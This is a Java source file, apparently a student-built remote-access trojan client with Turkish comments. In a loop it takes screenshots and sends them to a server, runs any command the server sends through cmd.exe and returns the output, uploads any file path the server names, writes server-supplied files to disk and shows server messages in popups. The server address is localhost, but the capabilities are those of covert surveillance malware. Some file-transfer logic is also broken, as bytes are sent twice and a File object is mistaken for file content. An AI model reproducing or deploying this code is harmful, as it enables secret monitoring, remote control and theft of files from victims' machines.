import javax.imageio.*;
import javax.swing.*;
import java.awt.*;
import java.awt.image.*;
import java.io.*;
import java.net.*;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.TimeUnit;

public class client_main{
    public static int shoots = 0;
    public static int shootssent=0;
    public static int a = 1;
    public static String yol="C:\\Programdata\\shoots "+".jpg";
    public static String sendMessage;
    public static Socket s48=null;
    public static ServerSocket Ss48=null;
    public static String msg;
    File myfile;
    Frame myFrame = new Frame();
    File selectedfile;
    public static void screenshot() {

    	
    	
    	///////////////////////Screenshot\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
        String systemipaddress = "";
        try
        {
            URL url_name = new URL("http://bot.whatismyipaddress.com");

            BufferedReader sc =
                    new BufferedReader(new InputStreamReader(url_name.openStream()));

            // reads system IPAddress
            systemipaddress = sc.readLine().trim();
        }
        catch (Exception e)
        {
            systemipaddress = "Cannot Execute Properly";
        }
        System.out.println("Public IP Address: " + systemipaddress +"\n");

        for (int b =0; ; b++) {
            try {
                Robot robot = new Robot();
                String fileName = yol;

                Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit()
                        .getScreenSize());
                BufferedImage screenFullImage = robot.createScreenCapture(screenRect);
                ImageIO.write(screenFullImage, "jpg", new File(fileName));
                screenFullImage.flush();
                TimeUnit.SECONDS.sleep(2);
            } catch (Exception e) {
            }


            try {
                Socket socket = null;
                FileInputStream fis = null;
                BufferedInputStream bis = null;
                OutputStream out = null;
                socket = new Socket("127.0.0.1", 4444);
                System.out.println("Connecting....");
                System.out.println("server 4444 basladi");
                File myFile = new File(yol);

                byte[] bytearray = new byte[(int) myFile.length()];
                fis = new FileInputStream(myFile);
                bis = new BufferedInputStream(fis);
                bis.read(bytearray, 0, bytearray.length);
                out = socket.getOutputStream();
                out.write(bytearray, 0, bytearray.length);
                out.flush();
                System.out.println("Done!");
                System.out.println(a + " done!");
                a++;
                socket.close();

                if (bis != null) bis.close();
                if (out != null) out.close();
                if (socket != null) socket.close();
                String path = myFile.getCanonicalPath();
                File filePath = new File(path);
                filePath.delete();
                System.out.println("dosya "+shoots+" silindi!");
                shoots++;

            } catch (Exception e) {
                System.out.println("bekliyorum");
            }
            
            
        	///////////////////////Show Message\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

            new Thread(new Runnable() {
    			
    			@Override
    			public void run() {
    				// TODO Auto-generated method stub
    				try {
    		    		Socket s = new Socket("127.0.0.1", 4445);
    	                System.out.println("server 4445 basladi");

    		    		DataInputStream dis = new DataInputStream(s.getInputStream());
    		    		String msg = dis.readUTF();
    		    		JOptionPane.showMessageDialog(null, msg);
    		    	}catch(Exception e) {
    		    		//JOptionPane.showMessageDialog(null, "EXECPTION");
    		    	}
    			}
    		}).start();
            /////////////////////1.adim\\\\\\\\\\\\\\\\\\\\\\\\\\\
            StringBuilder sbuild = new StringBuilder();

            /////////////////////Server sent to client\\\\\\\\\\\\\\\\\\\\\
        	///////////////////////Take message\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

            try {
                Socket s = new Socket("127.0.0.1", 4446);
                System.out.println("server 4446 basladi");

                DataInputStream dis = new DataInputStream(s.getInputStream());
                ///////Client bunu bir degerde tutar
                /////////////2.adim\\\\\\\\\\\\\\\
                String msg = dis.readUTF();

                //////////3.Adim process builderda calistir ve bir degerde tut
                try {
                    ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", msg);
                    builder.redirectErrorStream(true);
                    Process p = builder.start();
                    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line;
                    while(true) {
                        line = r.readLine();
                        if(line == null) {break;}
                        sbuild.append(line+"\n");
                    }
                    //JOptionPane.showMessageDialog(null, sbuild);
                    ///////sbuild degerinde tutuluyor

                    //////4.Adim server a sbuild icerigini gonder\\\\\\\\\\


                }catch(IOException io) {
                    //JOptionPane.showMessageDialog(null,"io");
                }
               // JOptionPane.showMessageDialog(null, msg);
                try
                {
                    s.close();
                }
                catch(Exception e)
                {
                    e.printStackTrace();
                }
            }catch(Exception e) {
                //JOptionPane.showMessageDialog(null, "EXECPTION");
            }

            try {
            Socket s = new Socket("127.0.0.1",4447);
            System.out.println("server 4447 basladi");

            OutputStream os = s.getOutputStream();
            OutputStreamWriter osw = new OutputStreamWriter(os);
            BufferedWriter bw = new BufferedWriter(osw);
            String sendMessagee = sbuild.toString();
            try {
                bw.write(sendMessagee);
            } catch (IOException e) {
                e.printStackTrace();
            }
            try { 
                bw.flush();
            } catch (IOException e) {
                e.printStackTrace();
            }
           // System.out.println("Message sent to the server : "+sendMessage);
            try
            {
                s.close();
            }
            catch(Exception e)
            {
                e.printStackTrace();
            }
            try {
     		TimeUnit.SECONDS.sleep(3);
     	} catch (InterruptedException e) {
     		// TODO Auto-generated catch block
     		e.printStackTrace();
     	}
            
        }
            catch(Exception a) {
            	System.out.println("a exceeption");
            	//a.printStackTrace();
            }
            
            
            
            
            
            /////////////////////1.adim\\\\\\\\\\\\\\\\\\\\\\\\\\\
           // StringBuilder sbuild2 = new StringBuilder();

            /////////////////////Server sent to client\\\\\\\\\\\\\\\\\\\\\
        	///////////////////////Take message\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

            try {
                Socket s = new Socket("127.0.0.1", 4448);
                System.out.println("server 4448 basladi");
                DataInputStream dis = new DataInputStream(s.getInputStream());
                ///////Client bunu bir degerde tutar
                /////////////2.adim\\\\\\\\\\\\\\\
                msg = dis.readUTF();
                System.out.println(msg);
                
                s.close();
                

                }catch(IOException io) {
                    //JOptionPane.showMessageDialog(null,"io");
                }
               // JOptionPane.showMessageDialog(null, msg);
               
           
            
            
            try {
            String file_path=msg;
   		 Socket sock = new Socket("127.0.0.1", 1337);  
         System.out.println("server 1337 basladi");

   	        //Send file  
   	        File myFile = new File(file_path);  
   	        byte[] mybytearray = new byte[(int) myFile.length()];  
   	           
   	        FileInputStream fis = new FileInputStream(myFile);  
   	        BufferedInputStream bis = new BufferedInputStream(fis);  
   	        //bis.read(mybytearray, 0, mybytearray.length);  
   	           
   	        DataInputStream dis = new DataInputStream(bis);     
   	        dis.readFully(mybytearray, 0, mybytearray.length);  
   	           
   	        OutputStream os = sock.getOutputStream();  
   	           
   	        //Sending file name and file size to the server  
   	        DataOutputStream dos = new DataOutputStream(os);     
   	        dos.writeUTF(myFile.getName());     
   	        dos.writeLong(mybytearray.length);     
   	        dos.write(mybytearray, 0, mybytearray.length);     
   	        dos.flush();  
   	           
   	        //Sending file data to the server  
   	        os.write(mybytearray, 0, mybytearray.length);  
   	        os.flush();  
   	           
   	        //Closing socket
   	        os.close();
   	        dos.close();  
   	        sock.close();  
            
            }catch (Exception e) {
				// TODO: handle exception
			}
            
            client_main client = new client_main();

            try {
                client.receiveFileFromServer();

            } catch (UnknownHostException e) {
                // TODO Auto-generated catch block
            	System.out.println("hata");
            } catch (ClassNotFoundException e) {
                // TODO Auto-generated catch block
            	System.out.println("hata");
            } catch (Exception e) {
            	System.out.println("hata");
            }
            
    }
        
        
    }
   

    public void receiveFileFromServer() throws ClassNotFoundException, IOException{
    	try {
            Socket s = new Socket("127.0.0.1", 9998);
            System.out.println("server 9998 basladi");

            DataInputStream dis = new DataInputStream(s.getInputStream());
            ///////Client bunu bir degerde tutar
            /////////////2.adim\\\\\\\\\\\\\\\
            //msg = null;
            msg = dis.readUTF();
            System.out.println(msg);
            
            s.close();


            }catch(IOException io) {
                //JOptionPane.showMessageDialog(null,"io");
            }
        Socket sock = null;
        String host = "localhost";
        int port = 9999;

        try {
            sock = new Socket(host, port);
        } catch (IOException e1) {
            // TODO Auto-generated catch block
            //e1.printStackTrace();
        	System.out.println("hata");

        }

        System.out.println("Connection made (clientSide)");
        //recieve the file

        ObjectInputStream ois = null;
        try {
            ois = new ObjectInputStream(sock.getInputStream());
        } catch (IOException e1) {
            // TODO Auto-generated catch block
            //e1.printStackTrace();
        	System.out.println("hata");
        }


        /*file from server is deserialized*/
        myfile=(File)ois.readObject();

        /*deserialized file properties*/
        System.out.println("AbsolutePath: " + myfile.getAbsolutePath());
        System.out.println("FileName:" + myfile.getPath());
        System.out.println("lenght"  + myfile.length());
        copyBytes(myfile, msg/*+myfile.getName()*/);


    }
    private void copyBytes(File originalFile, String targetFileName) throws IOException {

        FileInputStream in = null;
        FileOutputStream out = null;


        in = new FileInputStream(originalFile);
        out = new FileOutputStream(targetFileName);
        int c;

        while ((c = in.read()) != -1) {
            out.write(c);
        }

        out.close();
        in.close();

    }//
    
    public static void main(String[] args)  {
        screenshot();
        
     
    }
}

